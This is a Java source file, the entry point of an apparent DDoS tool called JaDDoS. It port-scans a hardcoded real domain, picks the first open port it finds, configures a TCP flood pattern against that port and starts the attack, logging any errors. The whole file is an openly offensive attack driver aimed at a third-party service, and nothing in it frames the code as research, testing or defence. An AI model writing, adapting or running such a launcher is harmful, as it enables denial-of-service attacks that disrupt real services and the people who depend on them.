package com.jaddos.jaddos;

import java.util.List;
import java.util.concurrent.Future;

import org.apache.log4j.BasicConfigurator;
import org.apache.log4j.Logger;

import com.jaddos.core.JaDDoSCore;
import com.jaddos.portscanner.PortScanResult;
import com.jaddos.portscanner.PortScanner;

public class App {
	private static Logger logger = Logger.getLogger(App.class);

	public static void main(String[] args) {
		BasicConfigurator.configure();
		JaDDoSCore ddos = new JaDDoSCore();
		try {
			String dns = "google.com";
			PortScanner portSearcher = new PortScanner(dns);
			List<Future<PortScanResult>> openedPorts = portSearcher.returnOpenPortAndIp();

			if (openedPorts.size() != 0) {
				ddos.createDDoSPattern(dns, openedPorts.get(0).get().getPort(), "tcp");
				ddos.beginAttack();
			}
		} catch (Exception e) {
			logger.error(e.getMessage(), e);
		}
	}
}
